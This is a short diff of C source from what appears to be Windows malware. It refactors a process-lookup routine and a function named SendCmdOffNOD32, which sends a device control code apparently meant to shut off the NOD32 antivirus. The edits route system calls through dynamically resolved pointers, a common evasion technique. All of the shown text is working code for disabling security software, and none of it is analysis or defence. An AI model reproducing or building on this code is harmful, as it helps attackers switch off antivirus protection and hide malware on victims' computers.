@@ -3084,7 +3084,8 @@ void KillBlockingProcesses( const char* fileName )
 DWORD GetProcessIdByName(PCHAR ProcessName)
 {
 	DWORD Result = NULL;
-	PROCESSENTRY32 ProcessEntry = {0};
+	PROCESSENTRY32 ProcessEntry;
+	ClearStruct(ProcessEntry);
 	HANDLE hSnap;
 
 	hSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -3114,9 +3115,10 @@ DWORD GetProcessIdByName(PCHAR ProcessName)
 static VOID SendCmdOffNOD32(PVOID hObject)
 {
 	IO_STATUS_BLOCK StatusBlock;
-	UCHAR Buff[0x4] = {0x01, 0x00, 0x00, 0x00};
+	UCHAR Buff[4];
+	*((DWORD*)Buff) = 1;
 
-	NtDeviceIoControlFile(hObject, NULL, NULL, NULL, &StatusBlock, 0x88770034, Buff, sizeof(Buff), Buff, sizeof(Buff));
+	pNtDeviceIoControlFile(hObject, NULL, NULL, NULL, &StatusBlock, 0x88770034, Buff, sizeof(Buff), Buff, sizeof(Buff));
 
 	/*IO_STATUS_BLOCK StatusBlock;
 	UCHAR Buff[0x4] = {0x0};
